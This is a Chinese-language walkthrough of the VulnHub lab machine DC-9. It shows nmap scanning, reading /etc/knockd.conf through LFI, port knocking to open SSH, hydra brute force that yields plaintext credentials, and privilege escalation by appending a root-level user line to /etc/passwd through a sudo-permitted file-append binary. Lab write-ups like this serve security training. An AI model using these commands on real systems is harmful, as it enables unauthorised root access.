该靶机难度中等。

1. 靶机信息

靶机地址：

  • DC: 9 ~ VulnHub

目标：

  • 拿到root权限
  • 拿到1个flag

难度：

  • 中

前置知识：

  • 端口敲门 (Port Knocking)

2. 信息收集

2.1. 端口信息

1. sudo arp-scan -l
2. sudo nmap -p- 10.0.2.45
3. sudo nmap -p22,80 -A 10.0.2.45

这里注意，22 端口变成了 filtered，如果此时直接连接，比如输入以下命令： 

ssh root@10.0.2.45

会直接报错。

3. get shell

经过搜索如何绕过 "ssh filtered"，发现了这是一个端口保护的机制，叫做 Port Knocking。

简单来说就是默认把ssh上锁，不允许远程连接。并且设置一个端口序列，只有按照该序列访问对应的端口，才能够使 ssh 变成 open。这样子，才能够远程连接。而默认的序列文件的路径为：/etc/knockd.conf。

利用LFI读取其中的内容：（只记录了序列） 

// /etc/knockd.conf
sequence: 7469, 8475, 9842

然后依次执行下列命令： 

1. nmap -p 7469
2. nmap -p 8475
3. nmap -p 9842

然后再次查看22端口的情况，发现变成了open 

nmap -p 22 10.0.2.45

接着利用 hydra 爆破上面所搜集的所有用户名和密码，得到下面三个可以使用的

// ssh 爆破
login: chandlerb   password: UrAG0D!
login: joeyt   password: Passw0rd
login: janitor   password: Ilovepeepee

4. 权限提升

随便一个之后进行信息收集，发现既没有suid，也没有sudo，也没有内核，也没有可疑进程，直到看到 janitor 的家目录下的某个文件 

// /home/janitor/passwords-found-on-post-it-notes.txt
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts

将这些密码添加到刚刚爆破的密码字典中，再次进行爆破，得到一个新的结果： 

login: fredf   password: B4-Tru3-001

登录该用户，发现终于有 sudo -l 了

查看该文件的权限以及内容 

1. ls -l /opt/devstuff/dist/test/test
2. strings /opt/devstuff/dist/test/test

基本看不懂。直接执行得到帮助信息 

fredf@dc-9:/opt/devstuff/dist/test$ ./test
Usage: python test.py read append

但是还是看不懂，并且这个 test.py 就很可疑，猜测这就是编译之前的文件。因此顺着目录往回找，终于在 /opt/devstuff 目录下找到了 test.py 文件，其内容为： 

#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()

说白了就是指定两个文件，会将第一个文件的内容追加到第二个文件中。

因此，思路就很清晰了，我们可以在 /etc/passwd 中追加一个 “root” 用户就好了。

首先，执行下述命令，创建一个文件，并且写入需要加入到 /etc/passwd 中的内容。 

echo "hdf:E1s2b9dIx7vPM:0:0:root:/root:/bin/bash" > s.txt

（注意，这里的密码可以用 openssl passwd [内容] 生成，如果追加的内容没有密码，则无法登录！）

然后执行下面命令，将内容写入 /etc/passwd 

sudo /opt/devstuff/dist/test/test s.txt /etc/passwd
